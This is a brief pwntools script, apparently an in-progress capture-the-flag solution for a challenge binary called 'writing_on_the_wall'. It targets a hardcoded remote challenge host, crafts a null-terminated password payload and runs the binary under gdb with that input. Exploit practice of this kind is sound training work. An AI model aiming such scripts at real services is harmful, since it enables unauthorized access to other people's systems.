from pwn import *

elf = ELF('./writing_on_the_wall')
libc = elf.libc

if args.REMOTE:
    p = remote('46.101.27.51', 30335)
else:
    p = process(elf.path)

p.recvuntil('>')

payload = b"".join(
	[
		b"w3tpass\x00",
	]
)

with open("output", "wb") as filp:
        filp.write(payload)
# p.sendline(b"w3tpass\x00")

p = elf.process()
g = gdb.attach(
	p,
	gdbscript="""
	b *main
	r < output
	"""
)

# p.interactive() 77 33 74 70 61 73